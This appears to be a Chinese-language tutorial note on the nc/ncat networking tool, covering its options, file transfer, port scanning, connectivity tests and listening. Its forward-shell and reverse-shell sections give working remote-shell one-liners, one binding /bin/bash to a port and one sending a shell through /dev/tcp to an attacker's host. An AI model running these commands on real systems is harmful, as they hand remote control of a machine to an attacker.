###### datetime:2024-04-17 09:27:00

###### author:nzb

[Software Defined Networking](https://tonydeng.github.io/sdn-handbook/)

## nc(ncat)

Ncat is a feature-packed networking utility which reads and writes data across networks from the command line；

- `nc(ncat)`：`Ncat`是一个功能丰富的网络实用工具；支持端口监听、远程通信、文件传输、端口扫描、反向Shell、端口转发功能；

- 格式：`ncat [OPTIONS...] [hostname] [port]`

- 常用参数：

| OPTIONS | 意义 | 
| :---: | ----- | 
| -l |  使用监听模式，意味着`nc`被当作`server`，侦听并接受连接，而非向其它地址发起连接 |
| -p |  设置本地主机使用的通信端口 |
| -s |  设置本地主机送出数据包的IP地址 |
| -u |  使用UDP传输协议 |
| -v |  显示指令执行过程 |
| -w |  设置等待连线的时间 |
| -z |  使用0输入/输出模式，只在扫描通信端口时使用 |

### nc、netcat、ncat区别：

- `nc`与`netcat`是一个组件，`ncat`是`nmap`分支下的一个命令；
- `nc / ncat` 在 `CentOS` 上是同一个命令工具，是一个功能丰富的网络实用程序，可通过命令行在网络上读写数据；
- 使用 `ncat` 时，尽量不要使用 `nc`，避免与 `netcat` 冲突；
- 若安装了 `ncat` 时，`nc、netcat`都成了 `ncat` 的 `alias` ，命令行里输入这三者都是一样的；
- `netcat` 和 `ncat` 的 `-z` 参数是不相等的；
- 可通过 `rpm -qa|grep nc` 命令，查看 `nc` 是指 `netcat` 还是 `ncat` ；
- `Ncat` 是在原始 `Netcat` 之上新增功能二次开发的另一款强大工具，也就是说 `Netcat` 有的功能 `Ncat` 都具备，并且 `Ncat` 还有更多强大的功能。

### 参考案例：

- 扫描80端口

```shell
# nc可用ncat代替
$ nc -nvv 192.168.3.1 80
```

- 远程通信

```shell
# ncat 命令在20000端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口;
# 输出和输入都在此shell中展示
Server$ nc -l 20000

Client$ nc [Server-IP] 20000

# 打印接收的时间
Server$ nc -l 20000 | ts '[%Y-%m-%d %H:%M:%S]'

Client$ nc [Server-IP] 20000 | ts '[%Y-%m-%d %H:%M:%S]'
```

- 文件传输

```shell
# 从Client传输文件到Server
# 需要在Server上使用nc监听,server上运行监听命令;
Server$ nc -lp 12345 >> test.log
# Client运行传输命令
Client$ nc -w 1 [Server-IP] 12345 < xxx.log

# 从Server传输文件到Client
# 需要在Server上使用nc监听,server上运行监听命令;
Server$ nc -lp 12345 < test.log
# Client运行传输命令
Client$ nc -w 1 [Server-IP] 12345 > xxx.log
```

- 目录传输

```shell
# 从Client传输文件到Server上;需要在Server上使用nc监听,server上运行监听命令;
# tar zxvf -  通过tar zxvf解压,从管道接收到的数据,`-`表示从管道接收数据;
Server$ nc -l 23456|tar zxvf -

# tar zcvf -  通过tar zcvf压缩,将目录`Directory`压缩后传输到管道中;`-`表示输出到管道中;
Client$ tar zcvf - [Directory] | nc [Server-IP] 23456
```

- 抓取`Banner`信息

```shell
# 一旦发现开放的端口，可以容易的使用ncat 连接服务抓取他们的banner
$ nc -v 172.31.100.7 21
```

- 正向`Shell`

正向`shell`是指攻击机主动连接靶机，并取得`shell`。通俗点说就是靶机自己绑定某个端口，等攻击机连接后将收到的数据给`bash`或`cmd`(后文简称`shell`)，执行结果再丢给攻击机。

```shell
# 正向shell是目标机(被攻击方)先执行nc命令，然后攻击机(攻击方)上再进行nc连接，即可反弹shell
# 正向shell需要目标机安装nc
# 正向shell 需要目标机firewalld可过滤

# target: 目标服务器系统(被攻击方)
target$ nc -lkvp 7777 -e /bin/bash

# attack: 攻击者系统(攻击方)
attack$ nc [Target-IP] 7777
```

- 反向`shell`

反向`shell`就是靶机带着`shell`来连攻击机，好处显而易见就是不用担心防火墙的问题了，当然也不是没有缺点；缺点就是攻击机的IP必须能支持靶机的主动寻址，
换句话来说就是攻击机需要有公网IP地址；举个例子如攻击机是内网ip或经过了NAT，靶机是公网IP，即使取得了命令执行权限靶机也无法将shell弹过来，这是网络环境的问题。

```shell
# attack: 攻击者系统(攻击方)
# -k: 当客户端从服务端断开连接后，过一段时间服务端也会停止监听;通过选项 -k 可以强制服务器保持连接并继续监听端口;即使来自客户端的连接断了server也依然会处于待命状态;
attack$ nc -lkvnp 6677

# target: 目标服务器系统(被攻击方)
# -i: 指定断开的时候,单位为秒
Client$ sh -i >& /dev/tcp/192.168.188.69/6677 0>&1
```

- 测试网速

```shell
# 服务端
Server$ nc -l <port> > /dev/null

# 客户端
Client$ nc [Server-IP] <port> < /dev/zero

```

- 测试连通性
    - 测试tcp一般会想到使用`telnet`
    - `telnet`不支持`udp`协议，所以我们可以使用`nc`，`nc`可以支持`tcp`也可以支持`udp`

```shell
# 测试tcp端口连通性
# nc -vz ip tcp-port
$ nc -zv 192.168.188.188 5432
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.188.188:5432.
Ncat: 0 bytes sent, 0 bytes received in 0.01 seconds.

# 测试udp端口连通性
# nc -uvz ip udp-port
$ nc -uzv 192.168.188.188 7899
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.188.188:7899.
Ncat: Connection refused.
```

- 端口监听

```shell
# 临时监听TCP端口
# nc -l port >> filename.out 将监听内容输入到filename.out文件中
$ nc -l 7789 >> a.out

# 永久监听TCP端口
# nc -lk port
$ nc -lk 7789 >> a.out

# 临时监听UDP
# nc -lu port
$ nc -lu 7789 >> a.out

# 永久监听UDP
# nc -luk port
$ nc -luk 7789 >> a.out
```